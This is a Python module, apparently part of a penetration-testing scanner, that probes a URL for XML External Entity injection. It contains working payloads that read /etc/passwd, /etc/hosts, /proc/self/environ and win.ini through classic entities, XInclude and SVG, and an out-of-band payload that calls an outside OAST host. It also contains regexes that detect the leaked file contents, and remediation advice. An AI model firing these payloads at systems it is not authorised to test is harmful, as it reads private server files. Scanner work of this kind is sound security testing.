"""XXE scanner — classic, blind OOB, XInclude, SVG upload vectors.

FP-elimination strategy
-----------------------
We use multiline regex patterns anchored to the exact format of known files
(/etc/passwd, /etc/hosts, /proc/self/environ, win.ini) instead of loose
substring matching. Loose checks like "nobody:" or "for 16-bit app support"
routinely fire on generic page content (e.g. error pages that mention "nobody",
or Microsoft-related HTML snippets).
"""
from __future__ import annotations
import asyncio
import re
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import XXE_PAYLOADS
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# Each regex must match the *complete* relevant line(s) of the target file to
# prevent matching accidental page text that shares a fragment.
XXE_CONFIRM_PATTERNS: list[re.Pattern] = [
 re.compile(r"^root:[^:]*:\d+:\d+:", re.MULTILINE),   # /etc/passwd
 re.compile(r"^127\.0\.0\.1\s+localhost", re.MULTILINE),  # /etc/hosts
 re.compile(r"^[A-Z_]+=[^\s]+$", re.MULTILINE),    # /proc/self/environ
 re.compile(r"^\[(fonts|extensions|mail|MCI)\s*\]", re.MULTILINE), # win.ini sections
]

XXE_PAYLOADS_EXTENDED = {
 "classic": [
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///Windows/win.ini">]><root>&xxe;</root>',
 ],
 "xinclude": [
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
  '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>',
 ],
 "svg": [
  '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image xlink:href="file:///etc/passwd" height="200" width="200"/></svg>',
 ],
}


def _matches_any_pattern(text: str) -> str | None:
 """Return the first matching pattern name, or None."""
 patterns = [
  ("/etc/passwd", XXE_CONFIRM_PATTERNS[0]),
  ("/etc/hosts", XXE_CONFIRM_PATTERNS[1]),
  ("/proc/self/environ", XXE_CONFIRM_PATTERNS[2]),
  ("win.ini",  XXE_CONFIRM_PATTERNS[3]),
 ]
 for name, pat in patterns:
  if pat.search(text):
   return name
 return None


async def _test_xxe_endpoint(
 url: str,
 payload: str,
 content_type: str,
 client: TalismanHTTPClient,
) -> dict[str, Any] | None:
 try:
  r = await client.post(
   url,
   content=payload.encode(),
   headers={"Content-Type": content_type},
   timeout=12,
  )
  matched = _matches_any_pattern(r.text)
  if matched:
   return {
    "url": url,
    "payload": payload[:200],
    "indicator": matched,
    "evidence": r.text[:500],
    "content_type": content_type,
   }
 except Exception:
  pass
 return None


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 oast_domain: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 console.print(f"\n[module][+] XXE Scanner[/module] -> [target]{url}[/target]")
 findings: list[dict[str, Any]] = []

 oob_payloads: list[tuple[str, str]] = []
 if oast_domain:
  oob_payloads = [
   (
    f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oast_domain}/xxe"> %xxe;]><root/>',
    "application/xml"
   ),
  ]

 test_cases: list[tuple[str, str]] = []
 for p in XXE_PAYLOADS_EXTENDED["classic"]:
  test_cases.append((p, "application/xml"))
  test_cases.append((p, "text/xml"))
 for p in XXE_PAYLOADS_EXTENDED["xinclude"]:
  test_cases.append((p, "application/xml"))
 test_cases.extend(oob_payloads)

 async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
  tasks = [_test_xxe_endpoint(url, payload, ct, client) for payload, ct in test_cases]
  results = await asyncio.gather(*tasks, return_exceptions=True)

  for result in results:
   if isinstance(result, dict):
    severity = "critical"
    title = f"XXE injection — {result['indicator']}"
    print_finding(title, severity, url)
    findings.append(result)
    if session:
     await session.add_finding(
      target=url, module="xxe",
      vuln_type="xxe",
      severity=severity, confidence="confirmed",
      title=title,
      description=(
       f"XML External Entity injection confirmed. "
       f"The server processed an external entity reference and returned "
       f"file system content. Indicator: {result['indicator']}"
      ),
      request=f"POST {url} ({result['content_type']})\n{result['payload']}",
      evidence=result["evidence"],
      reproduction=f"POST {url} with Content-Type: {result['content_type']} and XXE payload",
      remediation=(
       "1. Disable external entity processing in your XML parser.\n"
       "2. In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
       "3. In PHP: libxml_disable_entity_loader(true)\n"
       "4. Use JSON instead of XML where possible."
      ),
      cvss_score=9.1, cwe="CWE-611",
      references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
     )
    break

 console.print(f" Found {len(findings)} XXE vulnerabilities")
 return {"target": url, "findings": findings, "count": len(findings)}
